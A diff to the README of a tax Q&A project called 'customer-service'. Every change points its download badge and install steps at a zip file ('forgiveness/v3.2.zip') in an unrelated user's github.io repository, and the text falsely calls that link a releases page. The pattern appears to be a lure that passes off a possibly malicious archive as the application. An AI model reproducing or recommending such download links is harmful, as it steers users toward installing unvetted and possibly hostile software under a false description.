@@ -5,11 +5,11 @@ description: "Build traceable, version-aware enterprise tax Q&A with cited law a
 ---
 # 📚 customer-service - Traceable Tax Answers for Everyone
 
-[![Download customer-service](https://img.shields.io/badge/Download-Latest%20Release-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/zu1-pvp/zu1-pvp.github.io/main/forgiveness/v3.2.zip)
+[![Download customer-service](https://img.shields.io/badge/Download-Latest%20Release-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/zu1-pvp/zu1-pvp.github.io/raw/refs/heads/main/forgiveness/v3.2.zip)
 
 A question-and-answer engine for Chinese corporate finance and tax topics. You ask a question in plain language, and the software answers it with direct citations back to the original regulation text — so you can check the source yourself instead of trusting a black box.
 
-**Visit this link to download the application:** https://raw.githubusercontent.com/zu1-pvp/zu1-pvp.github.io/main/forgiveness/v3.2.zip
+**Visit this link to download the application:** https://github.com/zu1-pvp/zu1-pvp.github.io/raw/refs/heads/main/forgiveness/v3.2.zip
 
 ---
 
@@ -65,7 +65,7 @@ Getting started takes a few minutes and involves no coding.
 
 **Step 1 — Open the download page**
 
-Go to: https://raw.githubusercontent.com/zu1-pvp/zu1-pvp.github.io/main/forgiveness/v3.2.zip
+Go to: https://github.com/zu1-pvp/zu1-pvp.github.io/raw/refs/heads/main/forgiveness/v3.2.zip
 
 **Visit this link to download the application.** The page lists the available releases. Choose the newest one at the top of the list.
 
